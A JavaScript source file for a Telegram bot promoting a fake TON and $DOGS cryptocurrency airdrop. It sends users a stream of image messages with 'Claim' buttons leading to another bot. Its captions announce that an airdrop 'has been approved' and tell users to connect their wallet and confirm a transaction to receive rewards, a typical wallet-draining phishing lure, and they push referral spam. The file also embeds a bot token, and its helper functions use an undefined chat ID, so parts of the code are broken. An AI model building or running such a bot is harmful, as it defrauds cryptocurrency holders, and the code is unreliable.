const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs"); // This is to send images

// Replace with your Telegram bot token from BotFather
const token = "6635031110:AAGkR6o5eBIJdw2k2sC2YB4Sa3y4zYFv1nE";

// Create a new Telegram bot instance
const bot = new TelegramBot(token, { polling: true });

function home() {
  bot.sendPhoto(chatId, "https://mech247logs.com.ng/bot_image/1.jpeg", {
    caption:
      "🎁FREE SPIN FOR EVERYONE ARE WAITING FOR YOU!🤖\n\nTake part in the AIRDROP of 1.000.000.000 TON right now. Go to WEBAPP application, connect your wallet, perform tasks, invite your friends and earn additional TON.\n\n🚀Only thanks to you we exist, only thanks to you we made this AirDrop, let's move together!\n\n🤩The era of TONCOIN is not over, it has just begun!",
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "Claim $TON 💰",
            url: "https://t.me/dogsdrops_en_bot/dogsdrops_en"
          }
        ],
        [{ text: "More about AirDrop❓", callback_data: "how_it_works" }],
        [{ text: "Why Ton spin 🤔", callback_data: "why_to_spin" }]
      ]
    }
  });
}

function how_it_works() {
  // Send a message with an image and inline buttons
  bot.sendPhoto(chatId, "https://mech247logs.com.ng/bot_image/2.jpeg", {
    caption:
      "❤️How it works?\n\n1. Spin the Wheel: Engage with our interactive bot and spin the wheel for a chance to win fantastic prizes.\n2. Win Big: With every spin, you have the opportunity to win Toncoin, unique usernames, or anonymous Telegram numbers.\n3. Secure and Private: Built on the robust TON blockchain, TON Spin ensures your digital identity, data, and assets remain secure and private.",
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "Claim $TON 💰",
            url: "https://t.me/dogsdrops_en_bot/dogsdrops_en"
          }
        ],
        [{ text: "Get back 🚪", callback_data: "home" }]
      ]
    }
  });
}

function why_to_spin() {
  bot.sendPhoto(chatId, "https://mech247logs.com.ng/bot_image/4.jpeg", {
    caption:
      "❓Why TON Spin?\n\n🤑 Instant Rewards: Win prizes instantly and enjoy the benefits of the TON ecosystem.\n\n✅ Secure Transactions: Our platform leverages TON’s advanced blockchain technology to provide secure and transparent transactions.\n\n👥 User-Friendly: Easy to use, whether you are a crypto novice or a seasoned enthusiast.\n\n🍀 Community Driven: Join a growing community of users enjoying the perks of the Web3 world within Telegram.",
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "Claim $TON 💰",
            url: "https://t.me/dogsdrops_en_bot/dogsdrops_en"
          }
        ],
        [{ text: "Get back 🚪", callback_data: "home" }]
      ]
    }
  });
}

function withdraw() {
  // Send a message with an image and inline buttons
  bot.sendPhoto(chatId, "https://mech247logs.com.ng/bot_image/dog.jpeg", {
    caption:
      "DOGS : Refferal System Update\n\nWe will continue work on this flow so that eventually you will be able to make instant onchain withdrawals.\n\n🥶Every person can get 25.000 $DOGS from each friend\n💸To participate in airdrop the following conditions are required\n1. Share your link https://t.me/DogsDay2024_Bot/start=ref_1fStgE3 \n2.Invite 3 friends, and get additional bonuses\n3. Check allocation on Refferal System",
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "✨Withdraw $DOGS",
            url: "https://t.me/dogsdrops_en_bot/dogsdrops_en"
          }
        ]
      ]
    }
  });
}

function claim_dog() {
  bot.sendPhoto(chatId, "https://mech247logs.com.ng/bot_image/dog.jpeg", {
    caption:
      "DOGS : Refferal System Update\n\nWe will continue work on this flow so that eventually you will be able to make instant onchain withdrawals.\n\n🥶Every person can get 25.000 $DOGS from each friend\n💸To participate in airdrop the following conditions are required\n1. Share your link https://t.me/DogsDay2024_Bot \n2. Invite 3 friends, and get additional bonuses\n3. Check allocation on Refferal System",
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "Claim $DOGS🦴",
            url: "https://t.me/dogsdrops_en_bot/dogsdrops_en"
          }
        ]
      ]
    }
  });
}

function withdraw_dog() {
  bot.sendPhoto(chatId, "https://mech247logs.com.ng/bot_image/7.jpeg", {
    caption:
      "DOGS : Refferal System Update\n\nWe will continue work on this flow so that eventually you will be able to make instant onchain withdrawals.\n\n🥶Every person can get 25.000 $DOGS from each friend\n💸To participate in airdrop the following conditions are required\n1. Share your link https://t.me/DogsDay2024_Bot \n2. Invite 3 friends, and get additional bonuses\n3. Check allocation on Refferal System",
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "Withdraw DOGS",
            url: "https://t.me/dogsdrops_en_bot/dogsdrops_en"
          }
        ]
      ]
    }
  });
}

// On /start command, send a message with two inline buttons
bot.onText(/\/start/, msg => {
  const chatId = msg.chat.id;

  // Send a message with an image and inline buttons
  bot.sendPhoto(chatId, "https://mech247logs.com.ng/bot_image/1.jpeg", {
    caption:
      "🎁FREE SPIN FOR EVERYONE ARE WAITING FOR YOU!🤖\n\nTake part in the AIRDROP of 1.000.000.000 TON right now. Go to WEBAPP application, connect your wallet, perform tasks, invite your friends and earn additional TON.\n\n🚀Only thanks to you we exist, only thanks to you we made this AirDrop, let's move together!\n\n🤩The era of TONCOIN is not over, it has just begun!",
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "Claim $TON 💰",
            url: "https://t.me/dogsdrops_en_bot/dogsdrops_en"
          }
        ],
        [{ text: "More about AirDrop❓", callback_data: "how_it_works" }],
        [{ text: "Why Ton spin 🤔", callback_data: "why_to_spin" }]
      ]
    }
  });

  // Send a message with an image and inline buttons
  bot.sendPhoto(chatId, "https://mech247logs.com.ng/bot_image/2.jpeg", {
    caption:
      "❤️How it works?\n\n1. Spin the Wheel: Engage with our interactive bot and spin the wheel for a chance to win fantastic prizes.\n2. Win Big: With every spin, you have the opportunity to win Toncoin, unique usernames, or anonymous Telegram numbers.\n3. Secure and Private: Built on the robust TON blockchain, TON Spin ensures your digital identity, data, and assets remain secure and private.",
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "Claim $TON 💰",
            url: "https://t.me/dogsdrops_en_bot/dogsdrops_en"
          }
        ],
        [{ text: "Get back 🚪", callback_data: "home" }]
      ]
    }
  });

  // Send a message with an image and inline buttons
  bot.sendPhoto(chatId, "https://mech247logs.com.ng/bot_image/3.jpeg", {
    caption:
      "🎁FREE SPIN FOR EVERYONE ARE WAITING FOR YOU!\n\n🤖Take part in the AIRDROP of 1.000.000.000 TON right now. Go to WEBAPP application, connect your wallet, perform tasks, invite your friends and earn additional TON.\n\n🚀Only thanks to you we exist, only thanks to you we made this AirDrop, let's move together!\n\n🤩The era of TONCOIN is not over, it has just begun!",
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "Claim $TON 💰",
            url: "https://t.me/dogsdrops_en_bot/dogsdrops_en"
          }
        ],
        [{ text: "More about AirDrop❓", callback_data: "how_it_works" }],
        [{ text: "Why Ton spin 🤔", callback_data: "why_to_spin" }]
      ]
    }
  });

  // Send a message with an image and inline buttons
  bot.sendPhoto(chatId, "https://mech247logs.com.ng/bot_image/4.jpeg", {
    caption:
      "❓Why TON Spin?\n\n🤑 Instant Rewards: Win prizes instantly and enjoy the benefits of the TON ecosystem.\n\n✅ Secure Transactions: Our platform leverages TON’s advanced blockchain technology to provide secure and transparent transactions.\n\n👥 User-Friendly: Easy to use, whether you are a crypto novice or a seasoned enthusiast.\n\n🍀 Community Driven: Join a growing community of users enjoying the perks of the Web3 world within Telegram.",
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "Claim $TON 💰",
            url: "https://t.me/dogsdrops_en_bot/dogsdrops_en"
          }
        ],
        [{ text: "Get back 🚪", callback_data: "home" }]
      ]
    }
  });

  // Send a message with an image and inline buttons
  bot.sendPhoto(chatId, "https://mech247logs.com.ng/bot_image/5.jpeg", {
    caption:
      "DOGS : Refferal System Update\n\nWe will continue work on this flow so that eventually you will be able to make instant onchain withdrawals.\n\n🥶Every person can get 25.000 $DOGS from each friend\n💸To participate in airdrop the following conditions are required\n1. Share your link https://t.me/DogsDay2024_Bot/start=ref_1fStgE3 \n2.Invite 3 friends, and get additional bonuses\n3. Check allocation on Refferal System",
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "✨Withdraw $DOGS",
            url: "https://t.me/dogsdrops_en_bot/dogsdrops_en"
          }
        ]
      ]
    }
  });

  // Send a message with an image and inline buttons
  bot.sendPhoto(chatId, "https://mech247logs.com.ng/bot_image/6.jpeg", {
    caption:
      "DOGS : Refferal System Update\n\nWe will continue work on this flow so that eventually you will be able to make instant onchain withdrawals.\n\n🥶Every person can get 25.000 $DOGS from each friend\n💸To participate in airdrop the following conditions are required\n1. Share your link https://t.me/DogsDay2024_Bot \n2. Invite 3 friends, and get additional bonuses\n3. Check allocation on Refferal System",
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "Claim $DOGS🦴",
            url: "https://t.me/dogsdrops_en_bot/dogsdrops_en"
          }
        ]
      ]
    }
  });

  // Send a message with an image and inline buttons
  bot.sendPhoto(chatId, "https://mech247logs.com.ng/bot_image/7.jpeg", {
    caption:
      "DOGS : Refferal System Update\n\nWe will continue work on this flow so that eventually you will be able to make instant onchain withdrawals.\n\n🥶Every person can get 25.000 $DOGS from each friend\n💸To participate in airdrop the following conditions are required\n1. Share your link https://t.me/DogsDay2024_Bot \n2. Invite 3 friends, and get additional bonuses\n3. Check allocation on Refferal System",
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "Withdraw DOGS",
            url: "https://t.me/dogsdrops_en_bot/dogsdrops_en"
          }
        ]
      ]
    }
  });

  // Send a message with an image and inline buttons
  bot.sendPhoto(chatId, "https://mech247logs.com.ng/bot_image/8.jpeg", {
    caption:
      "✅ Your Airdrop has been approved!\n\n❓ Re-connect your wallet and verify to claim airdrop!\n\n💎3 Step To Get Reward💎\n\n1) Connect your wallet\n2) After connect In wallet you can see transaction with your drop amount\n3) Confirm transaction and you instant get your reward!\n1. Connect your wallet (Tonkeeper, tg-wallet, mytonwallet and other).\n2. After connecting in your wallet you can see the transaction with your drop amount,\n3. Confirm the transaction and you will be instantly rewarded!\n4. Invite 3 friends, and get additional bonuses",
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "Claim Rewards💎",
            url: "https://t.me/dogsdrops_en_bot/dogsdrops_en"
          }
        ]
      ]
    }
  });

  // Send a message with an image and inline buttons
  bot.sendPhoto(chatId, "https://mech247logs.com.ng/bot_image/9.jpeg", {
    caption:
      "✅ Your Airdrop has been approved!\n\n❓ Re-connect your wallet and verify to claim airdrop!\n\n💎3 Step To Get Reward💎\n\n1) Connect your wallet\n2) After connect In wallet you can see transaction with your drop amount\n3) Confirm transaction and you instant get your reward!\n1. Connect your wallet (Tonkeeper, tg-wallet, mytonwallet and other).\n2. After connecting in your wallet you can see the transaction with your drop amount,\n3. Confirm the transaction and you will be instantly rewarded!\n4. Invite 3 friends, and get additional bonuses",
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "Claim Rewards💎",
            url: "https://t.me/dogsdrops_en_bot/dogsdrops_en"
          }
        ]
      ]
    }
  });
  // Send a message with an image and inline buttons
  bot.sendPhoto(chatId, "https://mech247logs.com.ng/bot_image/9.jpeg", {
    caption:
      "✅ Your Airdrop has been approved!\n\n❓ Re-connect your wallet and verify to claim airdrop!\n\n💎3 Step To Get Reward💎\n\n1) Connect your wallet\n2) After connect In wallet you can see transaction with your drop amount\n3) Confirm transaction and you instant get your reward!\n1. Connect your wallet (Tonkeeper, tg-wallet, mytonwallet and other).\n2. After connecting in your wallet you can see the transaction with your drop amount,\n3. Confirm the transaction and you will be instantly rewarded!\n4. Invite 3 friends, and get additional bonuses",
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "Claim Rewards💎",
            url: "https://t.me/dogsdrops_en_bot/dogsdrops_en"
          }
        ]
      ]
    }
  });
});

// Handle the /more command manually (triggered from the inline button)
bot.on("callback_query", callbackQuery => {
  const message = callbackQuery.message;
  const data = callbackQuery.data;

  if (data === "why_to_spin") {
    // Send a message with information about the Dog bot and attach an image
    why_to_spin();
  } else if (data === "how_it_works") {
    how_it_works();
  } else if (data === "home") {
    home();
  }
});

// Listen for the /more command typed by the user
bot.onText(/\/more/, msg => {
  const chatId = msg.chat.id;

  // Send a message with information about the Dog bot and attach an image
  bot.sendPhoto(chatId, "https://mech247logs.com.ng/bot_image/dog.jpeg", {
    caption:
      "Dog bot helps you track airdrops and other rewards! Keep an eye out for more info."
  });
});
